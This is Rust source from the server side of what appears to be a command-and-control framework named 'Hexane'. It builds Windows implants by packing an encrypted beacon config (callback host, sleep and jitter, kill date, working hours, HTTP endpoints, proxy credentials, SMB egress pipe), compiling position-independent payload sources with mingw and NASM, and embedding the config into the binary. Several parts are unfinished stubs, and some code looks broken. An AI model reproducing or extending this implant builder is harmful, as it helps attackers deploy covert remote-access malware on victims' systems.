use std::fs;
use rand::Rng;
use std::str::FromStr;
use std::borrow::Borrow;
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::sync::mpsc::channel;

use rayon::prelude::*;

use crate::server::INSTANCES;
use crate::server::session::{CURDIR, SESSION};
use crate::server::types::{NetworkType, NetworkOptions, Config, Compiler, Network, Builder, Loader, UserSession, JsonData, BuildType};
use crate::server::utils::{create_directory, generate_hashes, run_command, wrap_message};
use crate::server::cipher::{crypt_create_key, crypt_xtea};
use crate::server::binary::embed_section_data;
use crate::server::error::{Error, Result};
use crate::server::stream::Stream;
use crate::{return_error, length_check_defer};

pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
    length_check_defer!(args, 3);

    let mut instance = match map_config(&args[2]) {
        Ok(instance)    => instance,
        Err(e)          => return Err(e),
    };

    instance.setup_instance()?;

    let ref session = SESSION.lock().unwrap();

    instance.user_session.username = session.username.clone();
    instance.user_session.is_admin = session.is_admin.clone();

    if let Some(network) = &instance.network {
        match network.r#type {
            NetworkType::Http   => instance.setup_listener()?,
            _                   => {}
        }
    }

    wrap_message("info", &format!("{} is ready", instance.builder.output_name));
    INSTANCES.lock().unwrap().push(instance);

    // todo: insert db

    Ok(())
}

pub(crate) fn remove_instance(args: Vec<String>) -> Result<()> {
    length_check_defer!(args, 3);
    // todo: remove from db

    let mut instances   = INSTANCES.lock().unwrap();
    if let Some(pos)    = instances.iter().position(|instance| instance.builder.output_name == args[2]) {

        wrap_message("info", &format!("removing {}", instances[pos].builder.output_name));
        instances.remove(pos);

        Ok(())
    }
    else {
        return_error!("Implant not found")
    }
}


pub(crate) fn interact_instance(args: Vec<String>) -> Result<()> {
    // todo:: implement
    Ok(())
}

fn map_config(file_path: &String) -> Result<Hexane> {
    let json_file   = CURDIR.join("json").join(file_path);

    let contents    = fs::read_to_string(json_file).map_err(Error::Io)?;
    let json_data   = serde_json::from_str::<JsonData>(contents.as_str())?;

    let mut instance    = Hexane::default();
    let session         = SESSION.lock().unwrap();

    instance.group_id       = 0;
    instance.main           = json_data.config;
    instance.loader         = json_data.loader;
    instance.builder        = json_data.builder;
    instance.network        = json_data.network;
    instance.user_session   = session.clone();

    Ok(instance)
}


#[derive(Debug, Default)]
pub struct Hexane {
    pub(crate) current_taskid:  u32,
    pub(crate) peer_id:         u32,
    pub(crate) group_id:        u32,
    pub(crate) build_type:      u32,

    pub(crate) crypt_key:       Vec<u8>,
    pub(crate) shellcode:       Vec<u8>,
    pub(crate) config_data:     Vec<u8>,
    pub(crate) active:          bool,

    pub(crate) main:            Config,
    pub(crate) builder:         Builder,
    pub(crate) compiler:        Compiler,
    pub(crate) network:         Option<Network>, // says "optional" but is checked for in config
    pub(crate) loader:          Option<Loader>,
    pub(crate) user_session:    UserSession,
}
impl Hexane {
    // todo: add config db write/delete

    fn setup_instance(&mut self) -> Result<()> {
        let mut rng = rand::thread_rng();

        let strings_file    = "./configs/strings.txt";
        let hash_file       = "./core/include/names.hpp";

        self.compiler.build_directory = format!("./payload/{}", self.builder.output_name);

        self.peer_id    = rng.random::<u32>();
        self.group_id   = 0;

        if self.main.debug {
            self.compiler.compiler_flags = "-std=c++23 -g -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC -fno-builtin -Wl,--no-seh,--enable-stdcall-fixup,--gc-sections".to_owned();
        }
        else {
            self.compiler.compiler_flags = "-std=c++23 -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel -fno-ident -fpack-struct=8 -falign-functions=1 -ffunction-sections -fdata-sections -falign-jumps=1 -w -falign-labels=1 -fPIC  -fno-builtin -Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections".to_owned();
        }

        wrap_message("debug", &"creating build directory".to_owned());
        create_directory(&self.compiler.build_directory)?;

        wrap_message("debug", &"generating config data".to_owned());
        self.generate_config_bytes()?;

        wrap_message("debug", &"generating string hashes".to_owned());
        generate_hashes(strings_file, hash_file)?;

        wrap_message("debug", &"building sources".to_owned());
        self.compile_sources()?;
        self.run_server()?;

        Ok(())
    }

    fn setup_listener(&mut self) -> Result<()> {
        // todo: listener setup
        Ok(())
    }

    fn run_server(&self) -> Result<()> {

        Ok(())
    }

    fn generate_config_bytes(&mut self) -> Result<()> {
        self.crypt_key  = crypt_create_key(16);
        let mut patch   = self.create_binary_patch()?;

        if self.main.encrypt {
            let patch_cpy   = patch.clone();
            patch           = crypt_xtea(&patch_cpy, &self.crypt_key, true)?;
        }

        self.config_data = patch;
        Ok(())
    }

    fn create_binary_patch(&mut self) -> Result<Vec<u8>> {
        let mut stream = Stream::new();

        if let Some(modules) = &self.builder.loaded_modules {
            for module in modules {
                stream.pack_string(module);
            }
        }

        stream.pack_bytes(&self.crypt_key);
        stream.pack_string(&self.main.hostname);

        stream.pack_dword(self.peer_id);
        stream.pack_dword(self.main.sleeptime);
        stream.pack_dword(self.main.jitter as u32);

        if let Some(ref modules) = self.builder.loaded_modules {
            for module in modules {
                stream.pack_string(module);
            }
        }

        let working_hours = if let Some(ref hours) = self.main.working_hours {
            i32::from_str(hours)?
        }
        else { 0 };

        let kill_date = if let Some(ref date) = self.main.killdate {
            i64::from_str(date)?
        }
        else { 0 };

        stream.pack_int32(working_hours);
        stream.pack_dword64(kill_date);

        if let Some(network) = self.network.as_mut() {
            match (&network.r#type, &network.options) {

                (NetworkType::Http, NetworkOptions::Http(ref http)) => {
                    stream.pack_wstring(http.useragent.as_ref().unwrap());
                    stream.pack_wstring(&http.address);
                    stream.pack_dword(http.port as u32);
                    stream.pack_dword(http.endpoints.len() as u32);

                    for endpoint in &http.endpoints {
                        stream.pack_wstring(endpoint);
                    }

                    if http.domain.is_some() {
                        stream.pack_string(http.domain.as_ref().unwrap().as_str());
                    }

                    if let Some(ref proxy) = http.proxy { // todo: proxy should not be exclusive to http (socks5, ftp, etc...)
                        let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);

                        stream.pack_dword(1);
                        stream.pack_wstring(&proxy_url);
                        stream.pack_wstring(proxy.username.as_ref().unwrap());
                        stream.pack_wstring(proxy.password.as_ref().unwrap());
                    }
                    else {
                        stream.pack_dword(0);
                    }
                },
                (NetworkType::Smb, NetworkOptions::Smb(ref smb)) => {
                    stream.pack_wstring(smb.egress_pipe.as_ref().unwrap().as_str());
                },

                _ => return_error!("unknown network type found in complete config... how could this happen?")
            }
        }

        Ok(stream.buffer)
    }

    fn compile_object(&mut self, mut command: String, source: String, mut flags: String) -> Result<()> {
        let mut defs: HashMap<String, Option<u8>> = HashMap::new();

        if command.trim() != "ld" && command.trim() != "nasm" {
            if self.main.debug {
                defs.insert("DEBUG".to_string(), None);
            }

            if &self.main.architecture == "amd64" {
                defs.insert("BSWAP".to_string(), Some(0));
            }
            else {
                defs.insert("BSWAP".to_string(), Some(1));
            }

            if let Some(network) = &self.network {
                match network.r#type {
                    NetworkType::Http => {
                        defs.insert("TRANSPORT_HTTP".to_string(), None);
                    }
                    NetworkType::Smb => {
                        defs.insert("TRANSPORT_PIPE".to_string(), None);
                    }
                }
            }
        }

        for (k, v) in &defs {
            command.push_str(&generate_definitions(&HashMap::from([(k.clone(), v.clone())])));
        }

        flags.push_str(&format!(" -o {} ", source_to_outpath(source, &self.compiler.build_directory)?));
        command.push_str(&flags);

        wrap_message("debug", &format!("Compiling : {:?}\n", &command));
        run_command(&command, &self.peer_id.to_string())?;

        Ok(())
    }

    pub fn compile_sources(&mut self) -> Result<()> {
        let src_path        = Path::new(&self.builder.root_directory).join("src");
        let mut components  = self.compiler.components.clone();

        let entries: Vec<_> = fs::read_dir(&src_path)
            .filter_map(|entry| entry.ok())
            .filter_map(|entry| fs::canonicalize(entry.path()).ok())
            .collect()?;

        let (err_send, err_recv)    = channel();
        let atoms                   = Arc::new(Mutex::new(()));

        entries.iter().for_each(|absolute_path| {
            if !absolute_path.is_file() {
                return;
            }

            let output  = self.builder.output_name.clone();
            let compile = self.compiler.compiler_flags.clone();

            let mut command = String::new();
            let mut flags   = String::new();

            let atoms_clone = Arc::clone(&atoms);
            let err_clone   = err_send.clone();
            let _guard      = atoms_clone.lock().unwrap();

            let absolute_str = match absolute_path.to_str() {
                Some(path_str) => {
                    let stripped_path = if path_str.starts_with(r"\\?\") || path_str.starts_with("//?/") {
                        &path_str[4..]
                    }
                    else {
                        path_str
                    };
                    stripped_path.replace("/", "\\")
                }
                None => {
                    eprintln!("Error: Cannot convert path to string: {:?}", absolute_path);
                    return;
                }
            };

            match absolute_path.extension().and_then(|ext| ext.to_str()) {
                Some("asm") => {

                    command.push_str("nasm");
                    flags = " -f win64 ".to_string();
                    flags.push_str(&absolute_str);
                }

                Some("cpp") => {

                    command.push_str("x86_64-w64-mingw32-g++");
                    flags.push_str(" -c ");
                    flags.push_str(&absolute_str);

                    flags.push_str(" ");
                    flags.push_str(compile.as_str());
                }

                _ => {
                    eprintln!("Unknown file extension: {:?}", absolute_path);
                    return;
                }
            }

            if let Err(e) = self.compile_object(command, absolute_str.clone(), flags) {
                eprintln!("Compilation error: {e}");
                err_clone.send(e).unwrap();
            } else {
                components.push(output);
            }
        });

        if let Ok(err) = err_recv.try_recv() {
            return_error!("{}", err);
        }

        wrap_message("debug", &"Linking final objects".to_owned());
        embed_section_data(&self.builder.output_name, ".text$F", &self.config_data.as_slice())?;

        // TODO: link all objects

        Ok(())
    }
}

pub fn generate_includes(includes: Vec<String>) -> String {
    includes.iter().map(|inc| format!(" -I{} ", inc)).collect::<Vec<_>>().join("")
}

pub fn generate_arguments(args: Vec<String>) -> String {
    args.iter().map(|arg| format!(" {} ", arg)).collect::<Vec<_>>().join("")
}

pub fn generate_definitions(definitions: &HashMap<String, Option<u8>>) -> String {
    let mut defs = String::new();

    for (name, def) in definitions {
        match def {
            None        => defs.push_str(&format!(" -D{} ", name)),
            Some(value) => defs.push_str(&format!(" -D{}={} ", name, value)),
        }
    }

    defs
}
